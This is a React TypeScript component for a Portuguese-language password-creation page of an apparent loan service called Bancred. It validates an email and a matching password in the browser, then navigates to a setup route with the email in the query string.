import { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { ShieldCheck, Mail, Lock, Eye, EyeOff, AlertCircle } from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import ConsultorCard from "@/components/ConsultorCard";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const inputStyle: React.CSSProperties = {
  width: "100%",
  padding: "14px 16px",
  border: "1.5px solid #E5E7EB",
  borderRadius: 12,
  fontSize: 16,
  outline: "none",
  boxSizing: "border-box",
  background: "#FFFFFF",
  color: "#111827",
  fontFamily: fontStack,
  minHeight: 50,
  WebkitAppearance: "none",
};

const labelStyle: React.CSSProperties = {
  display: "block",
  fontSize: 13,
  fontWeight: 600,
  color: "#111827",
  marginBottom: 6,
  fontFamily: fontStack,
};

const Senha = () => {
  const navigate = useNavigate();
  const [params] = useSearchParams();

  const [email, setEmail] = useState("");
  const [senha, setSenha] = useState("");
  const [confirmar, setConfirmar] = useState("");
  const [showSenha, setShowSenha] = useState(false);
  const [showConfirmar, setShowConfirmar] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    if (!email.includes("@") || !email.includes(".")) {
      setError("Informe um e-mail válido.");
      return;
    }
    if (senha.length < 6) {
      setError("A senha deve ter pelo menos 6 caracteres.");
      return;
    }
    if (senha !== confirmar) {
      setError("As senhas não coincidem.");
      return;
    }
    const qs = new URLSearchParams(params);
    qs.set("email", email);
    navigate(`/configurando?${qs.toString()}`);
  };

  return (
    <div
      style={{
        minHeight: "100dvh",
        background: "#F4F4F7",
        fontFamily: fontStack,
        color: "#111827",
        WebkitFontSmoothing: "antialiased",
      }}
    >
      <header
        style={{
          background: "#FFFFFF",
          borderBottom: "1px solid #E5E7EB",
          padding: "14px 16px",
          textAlign: "center",
        }}
      >
        <img src={logo} alt="Bancred" style={{ height: 104, width: "auto", display: "inline-block", objectFit: "contain" }} />
      </header>

      <main style={{ padding: "24px 16px", maxWidth: 480, margin: "0 auto" }}>
        <div style={{ marginBottom: 16 }}>
          <ConsultorCard />
        </div>
        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 16,
            padding: 24,
            boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)",
            border: "1px solid #E5E7EB",
          }}
        >
          <div
            style={{
              width: 48,
              height: 48,
              borderRadius: "50%",
              background: "#DBEAFE",
              color: "#1C68E3",
              display: "inline-flex",
              alignItems: "center",
              justifyContent: "center",
              marginBottom: 14,
            }}
          >
            <ShieldCheck size={22} />
          </div>
          <h1 style={{ fontSize: 20, fontWeight: 700, color: "#111827", marginBottom: 6 }}>
            Crie sua senha de acesso
          </h1>
          <p style={{ fontSize: 13, color: "#6B7280", marginBottom: 22, lineHeight: 1.5 }}>
            Defina suas credenciais para acessar a plataforma e acompanhar seu empréstimo.
          </p>

          <form onSubmit={handleSubmit} noValidate>
            <label style={labelStyle}>
              <Mail size={14} style={{ display: "inline", marginRight: 6, verticalAlign: -2 }} />
              E-mail
            </label>
            <input
              type="email"
              inputMode="email"
              autoComplete="email"
              placeholder="seu@email.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              style={{ ...inputStyle, marginBottom: 14 }}
            />

            <label style={labelStyle}>
              <Lock size={14} style={{ display: "inline", marginRight: 6, verticalAlign: -2 }} />
              Senha
            </label>
            <div style={{ position: "relative", marginBottom: 14 }}>
              <input
                type={showSenha ? "text" : "password"}
                placeholder="Digite sua senha (mín. 6 caracteres)"
                value={senha}
                onChange={(e) => setSenha(e.target.value)}
                style={{ ...inputStyle, paddingRight: 44 }}
              />
              <button
                type="button"
                aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
                onClick={() => setShowSenha((s) => !s)}
                style={{
                  position: "absolute",
                  right: 6,
                  top: "50%",
                  transform: "translateY(-50%)",
                  background: "transparent",
                  border: "none",
                  cursor: "pointer",
                  padding: 8,
                  color: "#6B7280",
                  display: "inline-flex",
                  alignItems: "center",
                }}
              >
                {showSenha ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>

            <label style={labelStyle}>
              <Lock size={14} style={{ display: "inline", marginRight: 6, verticalAlign: -2 }} />
              Confirmar senha
            </label>
            <div style={{ position: "relative", marginBottom: 18 }}>
              <input
                type={showConfirmar ? "text" : "password"}
                placeholder="Repita sua senha"
                value={confirmar}
                onChange={(e) => setConfirmar(e.target.value)}
                style={{ ...inputStyle, paddingRight: 44 }}
              />
              <button
                type="button"
                aria-label={showConfirmar ? "Ocultar senha" : "Mostrar senha"}
                onClick={() => setShowConfirmar((s) => !s)}
                style={{
                  position: "absolute",
                  right: 6,
                  top: "50%",
                  transform: "translateY(-50%)",
                  background: "transparent",
                  border: "none",
                  cursor: "pointer",
                  padding: 8,
                  color: "#6B7280",
                  display: "inline-flex",
                  alignItems: "center",
                }}
              >
                {showConfirmar ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>

            {error && (
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 8,
                  background: "#FEF2F2",
                  border: "1px solid #FECACA",
                  color: "#B91C1C",
                  padding: "10px 12px",
                  borderRadius: 10,
                  fontSize: 13,
                  marginBottom: 14,
                }}
              >
                <AlertCircle size={16} /> {error}
              </div>
            )}

            <button
              type="submit"
              style={{
                width: "100%",
                padding: "15px 20px",
                background: "#1C68E3",
                color: "#fff",
                border: "none",
                borderRadius: 14,
                fontSize: 16,
                fontWeight: 700,
                letterSpacing: -0.2,
                cursor: "pointer",
                boxShadow: "0 8px 24px rgba(28,104,227,0.28)",
                display: "inline-flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 8,
                minHeight: 52,
              }}
            >
              Continuar
            </button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default Senha;
